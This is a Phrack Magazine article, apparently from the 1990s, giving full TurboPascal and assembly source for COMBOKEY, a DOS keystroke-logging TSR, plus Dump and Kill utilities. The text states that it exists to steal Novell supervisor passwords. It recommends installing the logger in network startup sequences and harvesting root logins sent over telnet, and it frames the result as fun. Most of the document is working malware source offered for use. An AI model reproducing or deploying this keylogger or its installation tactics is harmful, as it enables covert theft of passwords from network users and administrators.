@@ -1,0 +1,440 @@
+                              ==Phrack Magazine==
+
+                 Volume Seven, Issue Forty-Eight, File 12 of 18
+
+
+                COMBOKEY and the Simplistic Art of PC Hacking
+                                    -or-
+                              KeyTrap Revisited
+
+                                  by Sendai
+                         (with apologies to Dcypher)
+
+NOTE: Of course I take no responsibility when you use this and get
+kicked out of school or something stupid.  Besides, why would you be so
+stupid as to get caught in the first place? :-) So be careful, and have
+fun.  Don't get stupid.
+
+WHAT YOU NEED FOR ANY OF THIS TO MAKE SENSE:
+* At least a reading knowledge of TurboPascal and 8086 assembly
+* A tolerable understanding of how the PC actually works or
+* A copy of Queue's "MS-DOS Programmer's Reference"
+* A copy of that yellow-spined "Indespensable PC Hardware Reference" book
+
+
+ON WITH IT...
+It was with a little dissatisfaction that I read Dcypher's KeyTrap
+article the other day (so I'm back-logged a few issues, so sue me!)
+I've been foolin' around with a version of this that I first wrote about
+five years ago during high school, and well, I thought mine was a little
+easier to understand.
+
+So I'm gonna show you my version, actually explain how the damn thing
+works, and hope somebody out there has their day brightened by using
+this program.
+
+Note that the only reason I wrote this thing was to record passwords on
+a Novell net. It will record all keypresses, but it really has limited
+use other than hacking.
+
+Fun fact: With this program, it has taken me an average of about six
+hours to snag supervisor on every Novell net I've nailed.  And I'm sure
+you can do better. ;-)
+
+
+PC KEYBOARD HANDLING 101
+Okay, a quick review for those PC newbies out there.  When a key is
+pressed on a PC, it generates an interrupt 9 (keyboard interrupt),
+causing the machine to look up the address of the 9th Interrupt Service
+Routine. The ISR is typically in ROM; the interrupt vector itself is
+not.
+
+A key recorder is a program that simply latches itself into the
+interrupt 9 handler by replacing the old vector with its own address.
+By doing this, every time a key is pressed, we know about it.
+
+
+ENTER COMBOKEY (That'd be the key recorder)
+I differ with my strategy from Dcypher in that I don't bother going
+directly to the keybard hardware.  COMBOKEY just goes ahead and calls
+the old ISR and then looks in the BIOS keyboard buffer to see what the
+key was. Yeah, you don't get the funky-ass key combinations like
+control-shift-right-alt-F2-Z, but hey, I'm just after the passwords.
+
+When a new key is pressed, it's dumped in the buffer.  When the buffer
+is full, nothing happens.  I'll leave writing it to a file as an
+exercise to the reader.
+
+My favorite feature, if I may say so myself, is the fact that COMBOKEY
+has an API in it, sort of.  Interrupt 255 is also latched and provides
+the "user" an interface to the presently running copy of COMBOKEY.  But
+not just anyone can go poking into 255 to kill COMBOKEY or get a buffer
+dump or whatever.  First, you gotta send a combination.
+
+Look at the "const" section of COMBOKEY and you'll see a constant array
+of four bytes.  Change these numbers to whatever the hell you want.  To
+use the COMBOKEY interface you need to send each of these bytes
+sequentially in AX to ISR 255.  Look at the "DoCombo" procedure in Dump
+or Kill to see what I mean.
+
+After you send the combo, you send one more byte that represents the
+command.
+
+Dump buffer:   AX=C0h    Dumps the buffer to a chunk of memory at ES:DI.
+Get info:      AX=C2h    Sends a TinfoRec (see source) to ES:DI.
+Kill:          AX=C1h    Deactivates the recorder.
+
+There are two additional programs following: Dump and Kill.  These just
+use the interface to do their appropriate actions.
+
+THE PROPER ETIQUETTE OF COMBOKEY
+There's a good deal of social engineering involved with using COMBOKEY.
+Since it works on only the machine you put it on, you have to know where
+to put it in the first place to be most effective.  (Or be really
+resourceful and put it on every machine around.)
+
+To maximize your amusement, get the supervisor password first, and then
+put this program in the startup sequence of the network.  Then go nuts.
+
+This program gets REALLY fun when your net is equipped with TCP/IP apps
+like Telnet, and some moron has their home machine hooked up to the
+Net, and they actually log into it  with root from your net.  Instant
+party.
+
+NEAT TRICKS TO TRY
+If I ever get around to it, it'd be cool to use the IPX interface to
+actually broadcast the keystrokes over to a waiting machine for instant
+feedback.
+
+The next trick to try is to maybe build a hardware version of this with
+a little microcontroller.  A Motorola 68HC11 would do nicely.  This
+would get rid of the pesky problem of reseting the machine or turning
+the power off.
+
+Ah well.  Comments and the like to jsrs@cyberspace.com.  Happy hunting.
+
+-------------------------------------------------------------------------------
+{ Source notes:
+  This'll compile on TurboPascal 6 or better.  Might even work with 5.
+  Why Turbo?  Cause it generates damn tight code, and it's much more readable
+  for the newbies than all assembly. }
+
+{ComboKey - It's a TSR, so we gotta do the mem setup. }
+{$M 1024, 0, 2100}
+program ComboKey;
+
+uses Dos; { For Keep() }
+
+const
+     DUMP_BUFFER = $C0;
+     KILL_RECORDER = $C1;
+     GET_INFO = $C2;
+
+     BUFSIZE = 2048;     { In bytes, NOT paragraphs! }
+     DISPLAY_MAX = 100;
+     combo: Array[0..3] of Byte = ( 01, 01, 19, 74 );
+
+type
+     PBuf = ^TBuf;
+     TBuf = Array[0..BUFSIZE-1] of Byte;
+     PInfoRec = ^TInfoRec;
+     TInfoRec = record
+          buffer_size: Word;  { Word is 16 bit, unsigned }
+          overwrite: Word;
+          buffer_ptr: Word;
+     end;
+
+var
+     old9o, old9s: Word; { Must be in this order! }
+     wptr: Word absolute $40:$1c; { Ptr to next avail slot in kbd buffer }
+     q_top: Word absolute $40:$80;
+     q_bot: Word absolute $40:$82;
+     buffer: PBuf;
+     buf_ptr: Word;
+     overwrite_ctr: Word;
+     last_wptr: Word;
+     tumbler: Byte; { How many numbers in the combo right so far? }
+
+procedure SetVector( int: Byte; s, o: Word);
+     begin
+          asm
+               push ds
+               cli
+               mov  ah, 25h
+               mov  al, int
+               mov  ds, s
+               mov  dx, o
+               int  21h
+               sti
+               pop  ds
+          end;
+     end;
+
+procedure NewInt09(Flags, CS, IP, AX, BX, CX, DX, SI, DI, DS, ES, BP: Word);
+interrupt;
+     var
+          offset: Word;
+          c: Byte;
+          l: Word;
+          ctr: Word;
+     begin
+          { First call the old handler.  Do the pushf,  cause this is an
+            interrupt handler. }
+          asm
+               pushf
+               call dword ptr [old9o]   { Since old9s is next, it works }
+               cli
+          end;
+
+          { This isn't a press, but a release - ignore it. }
+          if last_wptr = wptr then Exit;
+
+          last_wptr:=wptr;
+
+          { Did the queue just wrap? }
+          if (wptr = q_top) then offset:=q_bot-2
+          else offset:=wptr-2;
+
+          Inc(buf_ptr);
+          if (buf_ptr = BUFSIZE) then begin { we'd write it, but oh well. }
+               buf_ptr:=0;
+               Inc(overwrite_ctr);
+          end;
+
+          buffer^[buf_ptr]:=Mem[$40:offset];
+
+          asm
+               sti
+          end;
+     end;
+
+{ Here's the interface system.  Don't bother saving the old $FF,
+cause who uses it anyway?! }
+procedure NewIntFF(Flags, CS, IP, AX, BX, CX, DX, SI, DI, DS, ES, BP: Word);
+interrupt;
+     var
+          command: Word;
+          res, rdi: Word;
+          infoptr: PInfoRec;
+          l: Word;
+     begin
+          command:=AX;
+          res:=ES;
+          rdi:=DI;
+
+          if tumbler=4 then begin  { we have a winner... }
+          tumbler:=0;
+               asm
+                    sti
+               end;
+
+               case command of
+                    DUMP_BUFFER: begin
+                         asm
+                                   push ds
+                              mov  cx, BUFSIZE
+                              mov  es, [res]
+                              mov  di, [rdi]
+                              mov  ax, [WORD PTR buffer+2]
+                              mov  ds, ax
+                              mov  ax, [WORD PTR buffer]
+                              mov  si, ax
+
+                              cld
+                              rep  movsb
+                              pop  ds
+                         end;
+                    end;
+
+                    KILL_RECORDER: begin
+                         SetVector(9, old9s, old9o);
+                    end;
+
+                    GET_INFO: begin
+                         asm
+                              mov  es, [res]
+                              mov  di, [rdi]
+                              mov  ax, BUFSIZE
+                              mov  es:[di], ax
+                              mov  ax, [overwrite_ctr]
+                              mov  es:[di+2], ax
+                              mov  ax, [buf_ptr]
+                              mov  es:[di+4], ax
+                         end;
+                    end;
+               end;
+
+               asm
+                    cli
+               end;
+          end;
+
+          if command=combo[tumbler] then Inc(tumbler)
+          else tumbler:=0;
+     end;
+
+begin
+     asm
+          mov  ah, $35
+          mov  al, 9
+          int  $21
+
+          mov  ax, es
+          mov  old9s, ax
+          mov  old9o, bx
+     end;
+
+     SetVector(9, Seg(NewInt09), Ofs(NewInt09));
+     SetVector(255, Seg(NewIntFF), Ofs(NewIntFF));
+
+     buffer:=New(PBuf);
+     buf_ptr:=0;
+     overwrite_ctr:=0;
+     last_wptr:=0;
+     tumbler:=0;
+
+     Keep(0);
+end.
+
+
+
+-------------------------------------------------------------------------------
+
+{ Kills the keyrecorder }
+program Kill;
+
+const
+     combo0 = 01;
+     combo1 = 01;
+     combo2 = 19;
+     combo3 = 74;
+
+     KILL_RECORDER = $C1;
+
+procedure ResetCombo;
+     var
+     l: Word;
+   begin
+     for l:=1 to 4 do asm
+          mov  ax, 0
+         int   $ff
+      end;
+   end;
+
+procedure DoCombo;
+     begin
+          asm
+               mov  ax, combo0
+               int  $ff
+               mov  ax, combo1
+               int  $ff
+               mov  ax, combo2
+               int  $ff
+               mov  ax, combo3
+               int  $ff
+          end;
+     end;
+
+begin
+     ResetCombo;
+     DoCombo;
+     asm
+          mov  ax, KILL_RECORDER
+          int  $ff
+     end;
+end.
+
+
+-------------------------------------------------------------------------------
+
+{ Syntax:
+     DUMP DESTFILE.FIL
+
+  This'll dump the buffer information and contents to the file.  If 
+  no file is given, it goes to the screen. }
+
+program Dump;
+
+const
+     combo0 = 01;
+     combo1 = 01;
+     combo2 = 19;
+     combo3 = 74;
+
+     DUMP_BUFFER = $C0;
+     GET_INFO = $C2;
+
+type
+     PInfoRec = ^TInfoRec;
+     TInfoRec = record
+          buffer_size: Word;
+          overwrite: Word;
+          buffer_ptr: Word;
+     end;
+
+var
+     info: TInfoRec;
+     buffer: Array[0..8191] of Byte;
+     l: Word;
+     f: Text;
+
+procedure ResetCombo;
+     var
+          l: Word;
+     begin
+          for l:=1 to 4 do asm
+               mov  ax, 0
+               int  $ff
+          end;
+     end;
+
+procedure DoCombo;
+     begin
+          asm
+               mov  ax, combo0
+               int  $ff
+               mov  ax, combo1
+               int  $ff
+               mov  ax, combo2
+               int  $ff
+               mov  ax, combo3
+               int  $ff
+          end;
+     end;
+
+begin
+   Assign(f, ParamStr(1));
+   Rewrite(f);
+
+   ResetCombo;
+
+     DoCombo;
+     asm
+          mov  ax, SEG info
+          mov  es, ax
+          mov  di, OFFSET info
+          mov  ax, GET_INFO
+          int  $ff
+     end;
+
+     writeln(f,'Buffer size: ',info.buffer_size);
+     writeln(f,'Buffer ptr:  ',info.buffer_ptr);
+     writeln(f,'Overwrite:   ',info.overwrite);
+
+     DoCombo;
+     asm
+          mov  ax, SEG buffer
+          mov  es, ax
+          mov  di, OFFSET buffer
+          mov  ax, DUMP_BUFFER
+          int  $ff
+     end;
+
+     for l:=0 to info.buffer_ptr do begin
+          write(f, Char(buffer[l]));
+          if buffer[l] = 13 then write(f,#10);
+     end;
+     
+     Close(f);
+end.
+
